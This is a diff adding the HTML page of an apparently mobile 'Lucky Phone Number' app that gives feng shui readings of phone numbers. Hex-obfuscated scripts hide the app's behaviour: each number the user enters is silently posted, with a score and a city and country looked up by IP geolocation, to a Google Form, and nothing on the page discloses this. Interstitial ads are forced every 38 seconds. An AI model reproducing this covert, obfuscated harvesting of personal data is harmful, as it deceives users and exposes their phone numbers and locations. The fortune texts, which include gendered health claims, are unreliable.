@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<html lang="en">
+<!--<![endif]-->
+
+<head>
+    <!-- Basic Page Needs -->
+    <meta charset="utf-8">
+    <title>Lucky phone number</title>
+    <meta name="description" content="Is your phone number right for you? Or is it working against you? Lucky Phone Number analyzes your phone numbers and show you how lucky they are for you based on Feng Shui principles and algorithms." />
+    <meta name="keywords" content="lucky, phone, number, feng, shui, principle, mobile" />
+    <!-- Mobile Specific Metas -->
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <!-- CSS -->
+    <link rel="stylesheet" href="stuff/main.css">
+    <!--[if lt IE 9]><script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+    <!-- Javascript -->
+    <script src="jquery.min.js"></script>
+    <script type="text/javascript" charset="utf-8" src="cordova.js"></script>
+</head>
+
+<body onresize="onResize()" class="is-loading">
+    <!-- Wrapper -->
+    <div id="wrapper">
+        <!-- Main -->
+        <section id="main">
+            
+            <div id="mainHeader">
+                <header>
+                    <h1 style="font-weight:bold;">How lucky is your phone number?</h1>
+                    <p></p>
+                </header>
+            </div>
+            
+            <div id="details">
+                <form action="#" name="forma" id="theForm">
+                    <div class="field">
+                        <input type="tel" name="inpt" id="inputr" placeholder="Phone" style="font-size:1.5em; text-align:center" autocomplete="off"/> </div>
+                    <ul class="actions">
+                        <li><a href="#" class="button" type="button" onclick="suminp()">Analyze</a> </li>
+                    </ul>
+                </form>
+            </div>
+            
+            <!-- Results -->
+            <div id="results">
+                <h6 id="pnumber"></h6>
+                <p></p>
+                <div id="prophecy0" class="props">
+                    <h3>Destitute</h3>
+                    <p>You probably often feel short of money. You need to get a new phone number.</p>
+                </div>
+                <div id="prophecy1" class="props">
+                    <h3>Heaven</h3>
+                    <p>It is good for Male's use.
+                        <br>It makes a female more masculine. That may cause imbalance of Yin and Yang which could lead to disturbance in health or emotion.</p>
+                </div>
+                <div id="prophecy2" class="props">
+                    <h3>Earth</h3>
+                    <p>It is good for female's use.
+                        <br>It makes a male indecisive or powerless.</p>
+                </div>
+                <div id="prophecy3" class="props">
+                    <h3>Human</h3>
+                    <p>It means that you have troublesome interpersonal relationships.</p>
+                </div>
+                <div id="prophecy4" class="props">
+                    <h3>Wealth</h3>
+                    <p>It means you have good fortune.</p>
+                </div>
+                <div id="prophecy5" class="props">
+                    <h3>Help or Promotion</h3>
+                    <p>It means you often have someone who helps and supports you in life. This could be a good boss, good customers, good friend, or even a stranger who gives you a hand when you're in need.</p>
+                    <p>You have a lucky star shining upon your career endeavors.</p>
+                </div>
+                <div id="prophecyabove" class="props">
+                    <h3>Variables</h3>
+                    <p><b>The number exceeded the scope of analysis!</b> </p>
+                    <p>It is a result of their extraordinary characteristics, usually celebrities, big shot, so lucky symbols could not thesis.</p>
+                </div>
+                <div id="pleaseenternumber" class="props">
+                    <p><b>Please enter a phone number!</b> </p>
+                </div>
+                <br/> <a href="#" id="enterNew" class="button" type="button" onclick="resetStuff(); AdMob.showInterstitial(); ">Enter New Number</a> </div>
+            <footer> </footer>
+        </section>
+        
+        <!-- Footer -->
+        <footer id="footer" style="font-size:0.8em;">
+            <ul class="copyright">
+                <li>&copy;
+                    <script type="text/javascript">
+                        document.write(new Date().getFullYear());
+                    </script> Lucky Phone Number </li>
+                <li><a href="http://luckyphonenumber.tk/privacy-policy.html">Privacy Policy</a></li>
+            </ul>
+        </footer>
+    </div>
+    
+    <!-- essential for showing adMob Interstitial ads -->
+    <div style="display:none">
+        <input type='checkbox' id='autoshow' checked />auto show when ready
+        <br />
+        <div id='sizeinfo'></div>
+    </div>
+    <!-- END Ads -->
+    
+    
+    <!-- End Document ================================================== -->
+
+
+    <script>
+        if ('addEventListener' in window) {
+            window.addEventListener('load', function () {
+                document.body.className = document.body.className.replace(/\bis-loading\b/, '');
+            });
+            document.body.className += (navigator.userAgent.match(/(MSIE|rv:11\.0)/) ? ' is-ie' : '');
+        }
+    </script>
+    
+    <script>
+        function redBG() {}
+        function greenBG() {}
+    </script>
+    
+    <script>
+        function postContactToGoogle() {
+            
+            if (typeof myCity === "undefined"){
+                window.myCity = "N/A";
+            }
+            if (typeof myCountry === "undefined"){
+                window.myCountry = "N/A"
+            }
+            
+            $.ajax({
+                url: "https://docs.google.com/forms/d/1Z8MgUta_VEuQ7wSk80vAATiIuxrjEivdj6k6xqaTeyM/formResponse",
+                data: {
+                    "entry_1233926493": $("#inputr").val(),
+                    "entry_1330399588": finalTally,
+                    "entry_276219161": myCountry,
+                    "entry_1202517494": myCity
+                },
+                type: "POST",
+                dataType: "xml",
+                statusCode: {
+                    0: function() { },
+                }
+            });
+
+        }
+    </script>
+    
+    <!-- Sapangapat Pepentiping -->
+    <script type="text/javascript">
+        var _0xddae=["","\x76\x61\x6C","\x23\x69\x6E\x70\x75\x74\x72","\x35\x30\x25\x20\x35\x30\x25","\x6E\x6F\x6E\x65","\x63\x73\x73","\x23\x6D\x61\x69\x6E","\x73\x6C\x6F\x77","\x73\x6C\x69\x64\x65\x44\x6F\x77\x6E","\x23\x6D\x61\x69\x6E\x48\x65\x61\x64\x65\x72","\x23\x64\x65\x74\x61\x69\x6C\x73","\x66\x61\x73\x74","\x68\x69\x64\x65","\x2E\x70\x72\x6F\x70\x73","\x73\x6C\x69\x64\x65\x55\x70","\x23\x72\x65\x73\x75\x6C\x74\x73","\x72\x6F\x74\x61\x74\x65\x58\x28\x33\x36\x30\x64\x65\x67\x29","\x72\x65\x70\x6C\x61\x63\x65","\x6C\x65\x6E\x67\x74\x68","\x63\x68\x61\x72\x41\x74","\x66\x69\x6E\x61\x6C\x54\x61\x6C\x6C\x79","\x66\x6C\x6F\x6F\x72","\x66\x61\x64\x65\x49\x6E","\x23\x70\x72\x6F\x70\x68\x65\x63\x79","\x3C\x68\x36\x20\x69\x64\x3D\x22\x70\x6E\x75\x6D\x62\x65\x72\x22\x3E\x3C\x65\x6D\x3E","\x50\x68\x6F\x6E\x65\x20\x6E\x75\x6D\x62\x65\x72","\x3A","\x26\x6E\x62\x73\x70","\x3C\x2F\x65\x6D\x3E\x3C\x2F\x68\x36\x3E","\x72\x65\x70\x6C\x61\x63\x65\x57\x69\x74\x68","\x23\x70\x6E\x75\x6D\x62\x65\x72","\x50\x6C\x65\x61\x73\x65\x20\x65\x6E\x74\x65\x72\x20\x70\x68\x6F\x6E\x65\x20\x6E\x75\x6D\x62\x65\x72"];function resetStuff(){$(_0xddae[2])[_0xddae[1]](_0xddae[0]);$(_0xddae[6])[_0xddae[5]]({"\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x2D\x6F\x72\x69\x67\x69\x6E":_0xddae[3],"\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D":_0xddae[4]});$(_0xddae[9])[_0xddae[8]](_0xddae[7]);$(_0xddae[10])[_0xddae[8]](_0xddae[7]);$(_0xddae[15])[_0xddae[14]](_0xddae[11],function(){$(_0xddae[13])[_0xddae[12]]()})}function ResultLook(){$(_0xddae[6])[_0xddae[5]]({"\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x2D\x6F\x72\x69\x67\x69\x6E":_0xddae[3],"\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D":_0xddae[16]});$(_0xddae[9])[_0xddae[14]](_0xddae[11]);$(_0xddae[10])[_0xddae[14]](_0xddae[11]);$(_0xddae[15])[_0xddae[8]](_0xddae[7])}function suminp(){var _0xb842x4=$(_0xddae[2])[_0xddae[1]]();var _0xb842x5=_0xb842x4[_0xddae[17]](/\D/g,_0xddae[0]);function _0xb842x6(){while(_0xb842x5[_0xddae[18]]> 2){var _0xb842x7=0;for(i= 0;i< _0xb842x5[_0xddae[18]];i++){_0xb842x7= _0xb842x7+ parseInt(_0xb842x5[_0xddae[19]](i))};_0xb842x5= _0xb842x7+ _0xddae[0]};window[_0xddae[20]]= _0xb842x5- (Math[_0xddae[21]](_0xb842x5/ 6)* 6);$(_0xddae[23]+ finalTally)[_0xddae[22]](_0xddae[11],function(){});ResultLook();$(_0xddae[30])[_0xddae[12]]()[_0xddae[22]](5000)[_0xddae[29]](_0xddae[24]+ _0xddae[25]+ _0xddae[26]+ _0xddae[27]+ $(_0xddae[2])[_0xddae[1]]()+ _0xddae[28]);if((finalTally== 0)|| (finalTally== 3)){redBG()}}if(_0xb842x5== _0xddae[0]){alert(_0xddae[31])}else {_0xb842x6();postContactToGoogle()}}
+    </script>
+    <!-- END of Sapangapat Pepentiting -->
+    
+    <script>
+        var _0xf35a=["\x68\x69\x64\x65","\x23\x72\x65\x73\x75\x6C\x74\x73","\x2E\x70\x72\x6F\x70\x73","\x6B\x65\x79\x43\x6F\x64\x65","\x63\x74\x72\x6C\x4B\x65\x79","\x73\x68\x69\x66\x74\x4B\x65\x79","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x6B\x65\x79\x64\x6F\x77\x6E","\x23\x69\x6E\x70\x75\x74\x72","\x68\x74\x74\x70\x3A\x2F\x2F\x66\x72\x65\x65\x67\x65\x6F\x69\x70\x2E\x6E\x65\x74\x2F\x6A\x73\x6F\x6E\x2F","\x50\x4F\x53\x54","\x6A\x73\x6F\x6E\x70","\x6D\x79\x43\x69\x74\x79","\x63\x69\x74\x79","\x6D\x79\x43\x6F\x75\x6E\x74\x72\x79","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x6E\x61\x6D\x65","\x61\x6A\x61\x78","\x72\x65\x61\x64\x79"];$(document)[_0xf35a[17]](function(){$(_0xf35a[1])[_0xf35a[0]]();$(_0xf35a[2])[_0xf35a[0]]();$(_0xf35a[8])[_0xf35a[7]](function(_0xf014x1){if(_0xf014x1[_0xf35a[3]]== 46|| _0xf014x1[_0xf35a[3]]== 8|| _0xf014x1[_0xf35a[3]]== 9|| _0xf014x1[_0xf35a[3]]== 27|| (_0xf014x1[_0xf35a[3]]== 65&& _0xf014x1[_0xf35a[4]]=== true)|| (_0xf014x1[_0xf35a[3]]>= 35&& _0xf014x1[_0xf35a[3]]<= 39)){return}else {if(_0xf014x1[_0xf35a[5]]|| (_0xf014x1[_0xf35a[3]]< 48|| _0xf014x1[_0xf35a[3]]> 57)&& (_0xf014x1[_0xf35a[3]]< 96|| _0xf014x1[_0xf35a[3]]> 105)){_0xf014x1[_0xf35a[6]]()}}});$(_0xf35a[8])[_0xf35a[7]](function(_0xf014x2){if(_0xf014x2[_0xf35a[3]]== 13){suminp()}});jQuery[_0xf35a[16]]({url:_0xf35a[9],type:_0xf35a[10],dataType:_0xf35a[11],success:function(_0xf014x3){window[_0xf35a[12]]= _0xf014x3[_0xf35a[13]];window[_0xf35a[14]]= _0xf014x3[_0xf35a[15]]}})})
+    </script>
+    
+
+
+    <!-- Other stuff -->
+    <script>
+        //START Admob
+        var admobid = {};
+        if( /(android)/i.test(navigator.userAgent) ) { 
+            admobid = { // for Android
+                banner: 'ca-app-pub-3545086673654393/5969342403',
+                interstitial: 'ca-app-pub-3545086673654393/7166874008'
+            };
+        }  else {
+            admobid = { // for Windows Phone
+                banner: 'ca-app-pub-3545086673654393/5969342403',
+                interstitial: 'ca-app-pub-3545086673654393/7166874008'
+            };
+        }
+        //END Admob
+        
+        
+        // Wait for Cordova to load
+         //
+        document.addEventListener("deviceready", onDeviceReady, false);
+
+         // Cordova is ready
+         //
+        function onDeviceReady() {
+            //iabRef = window.open('http://apache.org', '_blank', 'location=yes');
+            //iabRef.addEventListener('loadstart', iabLoadStart);
+            //iabRef.addEventListener('loadstop', iabLoadStop);
+            //iabRef.addEventListener('exit', iabClose);
+
+            $(document).on('click', 'a[href^=http], a[href^=https]', function (e) {
+
+                e.preventDefault();
+                var $this = $(this);
+                var target = $this.data('inAppBrowser') || '_system';
+
+                window.open($this.attr('href'), target, 'location=no');
+            });
+            
+            
+            if (AdMob) {
+                AdMob.createBanner({
+                    adId : admobid.banner,
+                    position : AdMob.AD_POSITION.BOTTOM_CENTER,
+                    autoShow : true
+                });
+                
+                initAd();
+                prepareInterstitial();                
+            }
+            
+                                
+        
+        } //END-ondeviceready
+        
+        
+        function prepareInterstitial() {
+            var autoshow = document.getElementById('autoshow').checked;
+            AdMob.prepareInterstitial({adId:admobid.interstitial, autoShow:true});
+        }
+        
+        function onResize(){
+            var s = document.getElementById('sizeinfo');
+            s.innerHTML = "web view: " + window.innerWidth + " x " + window.innerHeight;
+        }
+        
+        function initAd(){
+            var defaultOptions = {
+                // adSize: 'SMART_BANNER',
+                // width: integer, // valid when set adSize 'CUSTOM'
+                // height: integer, // valid when set adSize 'CUSTOM'
+                position: AdMob.AD_POSITION.BOTTOM_CENTER,
+                // offsetTopBar: false, // avoid overlapped by status bar, for iOS7+
+                bgColor: 'black', // color name, or '#RRGGBB'
+                // x: integer,		// valid when set position to 0 / POS_XY
+                // y: integer,		// valid when set position to 0 / POS_XY
+                isTesting: false, // set to true, to receiving test ad for testing purpose
+                // autoShow: true // auto show interstitial ad when loaded, set to false if prepare/show
+            };
+            AdMob.setOptions( defaultOptions );
+            registerAdEvents();
+        }
+        
+        function registerAdEvents() {
+            // new events, with variable to differentiate: adNetwork, adType, adEvent
+            document.addEventListener('onAdFailLoad', function(data){
+                //alert('error: ' + data.error + 
+                //      ', reason: ' + data.reason + 
+                //      ', adNetwork:' + data.adNetwork + 
+                //      ', adType:' + data.adType + 
+                //      ', adEvent:' + data.adEvent); // adType: 'banner', 'interstitial', etc.
+            });
+            document.addEventListener('onAdLoaded', function(data){});
+            document.addEventListener('onAdPresent', function(data){});
+            document.addEventListener('onAdLeaveApp', function(data){});
+            document.addEventListener('onAdDismiss', function(data){});
+        }
+        
+    </script>
+    <!-- END Other stuff -->
+
+
+<!-- Modal -->
+	<script type="text/javascript">
+		function iklan() {
+			setTimeout(function() {
+				$('#modal2').trigger('openModal');
+			}, 500);
+		}
+		
+		$(window).load(function() {
+            
+            setInterval(function() {
+                AdMob.showInterstitial();
+            }, 38000);
+			
+		});
+		
+	</script>
+<!-- Modal -->
+
+
+    <!-- Start of StatCounter Code for Dreamweaver -->
+    <script type="text/javascript">
+        var sc_project = 9832759;
+        var sc_invisible = 1;
+        var sc_security = "be709236";
+        var scJsHost = (("https:" == document.location.protocol) ?
+            "https://secure." : "http://www.");
+        document.write("<sc" + "ript type='text/javascript' src='" +
+            scJsHost +
+            "statcounter.com/counter/counter.js'></" + "script>");
+    </script>
+    <noscript>
+        <div class="statcounter">
+            <a title="web analytics" href="http://statcounter.com/" target="_blank">
+                <img class="statcounter" src="http://c.statcounter.com/9832759/0/be709236/1/" alt="web analytics">
+            </a>
+        </div>
+    </noscript>
+    <!-- End of StatCounter Code for Dreamweaver -->
+
+
+</body>
+
+</html>
